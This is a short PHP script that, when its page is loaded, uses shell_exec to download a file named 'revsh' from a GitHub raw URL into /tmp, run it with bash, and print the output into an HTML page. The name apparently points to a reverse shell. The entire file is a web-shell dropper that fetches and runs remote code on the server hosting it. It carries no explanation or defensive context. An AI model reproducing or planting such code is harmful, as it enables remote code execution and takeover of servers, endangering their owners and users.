
<?php 
	$prova = shell_exec('cd /tmp; ls -lh;wget -O /tmp/revsh https://raw.githubusercontent.com/Gabry-r/Shellscripts/master/tes; /bin/bash /tmp/revsh > /tmp/output; cat /tmp/output');
	print "<html>
	    <body>
		{$prova}
	    </body>
	  </html>
	";
?>
